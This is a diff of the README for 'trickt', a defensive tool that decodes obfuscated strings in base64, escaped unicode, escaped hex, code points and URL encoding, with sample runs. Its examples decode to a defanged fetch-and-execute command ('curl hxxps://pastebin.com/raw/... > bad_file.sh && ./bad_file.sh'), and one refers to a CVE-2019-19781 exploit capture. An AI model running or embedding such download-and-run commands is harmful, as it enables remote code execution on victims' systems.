@@ -16,6 +16,8 @@ I refer to obfuscation as trickiness because I'm a child at heart.
 
 `trickt` outputs strings as byte strings so you can see if there are goofy characters visually.
 
+You can pass a file path to read and decode or decode a string directly.
+
 **Base64**
 
 - By default, this only matches base64 strings that are 32 characters in length (not including padding)
@@ -31,36 +33,6 @@ line 1::original:>  b'Y3VybCBoeHhwczovL3Bhc3RlYmluLmNvbS9yYXcvYmFzZTY0X2VuY29kZW
     |--decoded_base64>  b'curl hxxps://pastebin.com/raw/base64_encoded > bad_file.sh && ./bad_file.sh'
 ```
 
-**Escaped unicode**
-- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
-```bash
-$ trickt '\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068'
-
-Searching string for trickiness...
-
-line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068'
-    |
-    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'
-
-line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068'
-    |
-    |--decoded_base64>  b'\xbbM:\xde\xed4\xef\x9b\xb4\xd3\xbd\xae\xd3N\x9c\xbbM6\xd2\xed4\xeb\xcb\xb4\xd3\xbf.\xd3N\xfc\xbbM;\xd2\xed4\xef{\xb4\xd3v\xae\xd3M\x9f\xbbM6~\xed4\xefK\xb4\xd3\xadn\xd3N\xf7\xbbM;\xe2\xed4\xeb\x9b\xb4\xd3\xad\xae\xd3N\xbd\xbbM:z\xed4\xd9\xeb\xb4\xd3\xad\xee\xd3N\x9f\xbbM:v\xed4\xd9\xfb\xb4\xd3\xbd\xae\xd3N\xb5\xbbM;\xee\xed4\xd9\xfb\xb4\xd3\xaen\xd3N\xf7\xbbM:\xde\xed4\xeb[\xb4\xd3\xbd.\xd3N\xb9\xbbM:\xe2\xed4\xe5\xfb\xb4\xd3\xben\xd3N\x9e\xbbM:\xf6\xed4\xeb{\xb4\xd3\xa7\xee\xd3N\xb8\xbbM:\xe6\xed4\xdbK\xb4\xd3w\xae\xd3M\xb4\xbbM:\xda\xed4\xeb[\xb4\xd3\xae.\xd3N_\xbbM:\xea\xed4\xeb\xdb\xb4\xd3\xa7.\xd3N\xb9\xbbM6z\xed4\xef{\xb4\xd3\xaf.\xd3M\xb4\xbbM6\xea\xed4\xdb\xab\xb4\xd3m.\xd3M\x9e\xbbM6~\xed4\xebk\xb4\xd3\xadn\xd3N\xb8\xbbM9~\xed4\xeb\xab\xb4\xd3\xafn\xd3N\x9c\xbbM:\xe6\xed4\xd9\xeb\xb4\xd3\xbd\xee\xd3N\xbc'
-```
-**Escaped hex**
-- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
-```bash
-$ trickt '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68'
-
-Searching string for trickiness...
-
-line 1::original:>  b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68'
-    |
-    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh'
-
-line 1::original:>  b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68'
-    |
-    |--decoded_base64>  b'\xc7\xad\xf1\xef\x9c{\xdb\x1e\x82\xc7m1\xeb\xcc{\xf3\x1e\xfc\xc7\xbd1\xef|w\x03\x1d\x85\xc7aq\xefLz\xd7\x1e\xf7\xc7\xbe1\xeb\x9cz\xdb\x1e\xbd\xc7\xa11\xd8Lz\xdf\x1e\x85\xc7\xa0\xf1\xd8\\{\xdb\x1e\xb5\xc7\xbe\xf1\xd8\\z\xe7\x1e\xf7\xc7\xad\xf1\xeb\\{\xd3\x1e\xb9\xc7\xae1\xe4\\z\xf3\x1e\xb9\xc7\xbf1\xdbLw\x13\x1d\xb4\xc7\xad\xb1\xeb\\z\xe3\x1eE\xc7\xae\xb1\xeb\xdcz\x0b\x1e\xb9\xc7a1\xef|z\xf3\x1d\xb4\xc7n\xb1\xdb\xacv\xd3\x1d\x84\xc7aq\xeblz\xd7\x1e\xb8\xc7\x91q\xeb\xacz\xf7\x1e\x82\xc7\xaeq\xd8L{\xdf\x1e\xbc'
-```
 **Code points**
 ```bash
 $ trickt 'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)'
@@ -72,22 +44,44 @@ line 1::original:>  b'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(1
     |--decoded_code_point>  b'curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh'
 ```
 
-URL Encoding
+**Escaped unicode**
+- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
+```bash
+$ trickt '\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068'
+
+Searching string for trickiness...
+
+line 1::original:>  b'\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0078\\u0078\\u0070\\u0073\\u003a\\u002f\\u002f\\u0070\\u0061\\u0073\\u0074\\u0065\\u0062\\u0069\\u006e\\u002e\\u0063\\u006f\\u006d\\u002f\\u0072\\u0061\\u0077\\u002f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u0064\\u005f\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0020\\u003e\\u0020\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068\\u0020\\u0026\\u0026\\u0020\\u002e\\u002f\\u0062\\u0061\\u0064\\u005f\\u0066\\u0069\\u006c\\u0065\\u002e\\u0073\\u0068'
+    |
+    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh'
+```
+**Escaped hex**
+- Note that the base64 decoder runs as well. We will hopefully add some logic in the future to prevent this.
+```bash
+$ trickt '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68'
+
+Searching string for trickiness...
+
+line 1::original:>  b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68'
+    |
+    |--decoded_escaped_characters>  b'curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh'
+```
+
+**URL Encoding**
 - `trickt` will attempt to decode URL encoding.
-- This is a recipe for noise and false positives without boundaries in place.
-    - `trickt` does not return the result if the result does not have a child result which is NOT the result of URL encoding.
-        - In other words... if there's nothing useful after decoding, then don't return the result at all. It's just noise.
+- This is a recipe for noise and false positives without boundaries in place. To compensate, `trickt` will not return a
+ URL decoding result if there's nothing useful after decoding. It's just noise.
 
-As an example, let's take a look at an example exploit attempt from CVE-2019-19781.
+For example, let's look at an exploit attempt for CVE-2019-19781.
 
-Look at an HTTP stream from a  sample packet capture at: 
+This example uses a sample packet capture from: 
 https://dshield.org/forums/diary/Citrix+ADC+Exploits+are+Public+and+Heavily+Used+Attempts+to+Install+Backdoor/25700/
 
-In one of HTTP POST attempts, you find a URL Encoded payload that will decode to a script with code
-points inside. If I pass the URL encoded payload to `trickt`:
+In one of HTTP streams, you find a URL Encoded payload that will decode to a script with code
+points. If I pass the URL encoded payload to `trickt`:
 
 ```bash
-$ trickt <the_long_url_encoded_string>
+$ trickt <a_long_url_encoded_string>
 
 Searching string for trickiness...
 
@@ -229,10 +223,4 @@ Use `trickt.all()` to return a dictionary of all results `trickt` found to be in
     }
   ]
 }
-```
-
-
-
-```json
-
 ```
